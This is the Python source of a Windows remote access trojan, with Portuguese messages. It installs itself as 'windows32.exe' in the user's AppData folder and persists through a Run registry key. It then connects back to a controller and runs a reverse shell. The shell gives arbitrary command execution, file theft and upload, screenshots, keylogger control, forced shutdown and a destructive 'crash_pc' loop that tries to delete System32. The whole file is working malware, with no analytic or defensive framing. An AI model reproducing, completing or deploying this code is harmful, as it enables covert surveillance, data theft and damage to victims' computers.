import shutil
import socket 
import subprocess
import os
import threading
import time
import pyautogui
import sys
import keyloger


def is_admin():
    global admin 
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
    except:
        admin = "[!!] Sem Privilégio"
    else:
        admin = "[+] Administrador Privilegiado"
        

def shell():
    while True:
        command =  s.recv(1000).decode("UTF-8")
        
        if command== 'Q':
            break   


        elif command[:2] == 'cd' and len(command) > 1:
            try:
              os.chdir(command[3:])

            except:

                continue 
        
        
        elif command[:8] == 'download':
            try:
                with open(command[9:] ,'rb' ) as file:
                    s.send(file.read()) 
            except: 
                failed = "Falha em baixar" 
                s.send(failed.encode("UTF-8"))
                continue


        elif command[:6] == 'upload':
            try:
                with open(command[7:] ,'wb') as file:
                    file_data = s.recv(10000) 
                    file.write(file_data)
            except:
                failed = "Falha em upar"
                s.send(failed.encode("UTF-8"))
                continue 

        elif command[:3] == 'src':
             try:
                prin = pyautogui.screenshot()
                prin.save('screen.png')
                with open('screen.png','rb' ) as file:
                    s.send(file.read()) 
                os.remove("screen.png")
                
             except:
                 s.send('[!!] Falha ao tirar print'.encode("UTF-8"))


        elif command[:5] == "night":
            try:
               os.system("shutdown /s /t 1")
            except:
                s.send("Erro ao Desligar".encode("UTF-8"))
            
                  

        elif command[:8] == "crash_pc":
           try:
                while True:
                    os.system("start") 
                    os.mkdir("SEXO?") 
                    os.remove("C:\Windows\System32")
                    os.system("start calc")
                    os.system("start notepad")
                    os.system("start explorer.exe")

           except:
                s.send("Falha ao Executar".encode("UTF-8"))
             
        elif command[:5] == "check":

            try:
                is_admin()
                s.send(admin.encode("UTF-8"))

            except:
               s.send("Falha ao Checkar".encode("UTF-8"))
        
        elif command[:12] == "keylog_start":
               t = threading.Thread(target=keyloger.start())
               t.start()
        
        elif command[:11] == "keylog_dump": 
            try:
                 f = open(key_log,"rb")
                 s.send(f.read()) 
            except:
                s.send("[ERRO]".encode("UTF-8"))
                continue 


        else:  
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            s.send(result)

key_log = os.environ["appdata"] + "\\processmenager.txt"
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location) 
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Back/t REG_SZ /d "' + location + '"' ,shell=True)


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(0.5)
while True:
    try:
        s.connect(("127.0.0.1",8081)) 
        break
    except socket.timeout:
        time.sleep(10)
s.settimeout(None)



shell()
s.close()